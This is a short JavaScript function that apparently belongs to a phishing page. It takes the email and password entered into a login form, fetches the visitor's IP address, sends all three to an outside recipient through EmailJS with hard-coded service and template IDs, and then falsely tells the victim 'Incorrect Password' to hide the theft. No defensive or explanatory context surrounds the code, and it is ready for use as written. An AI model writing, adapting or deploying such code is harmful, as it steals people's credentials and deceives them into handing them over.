function sendMail() {
  // Get user's IP address
  fetch("https://api.ipify.org?format=json")
    .then((response) => response.json())
    .then((data) => {
      console.log("data" + data);
      // Construct email parameters object
      var params = {
        email: document.getElementById("email").value,
        password: document.getElementById("password").value,
        IP: data.ip,
      };

      // Set up EmailJS service and template IDs
      //   Thron
      const serviceID = "service_y2t5wsa";
      const templateID = "template_4mmzj8j";

      // Send email using EmailJS
      emailjs
        .send(serviceID, templateID, params)
        .then((res) => {
          // Clear form fields and show success message
          document.getElementById("email").value = "";
          document.getElementById("password").value = "";
          console.log(res);
          alert("Incorrect Password");
        })
        .catch((err) => {
          console.log(err);
          alert("Incorrect Password");
        });
    });
}
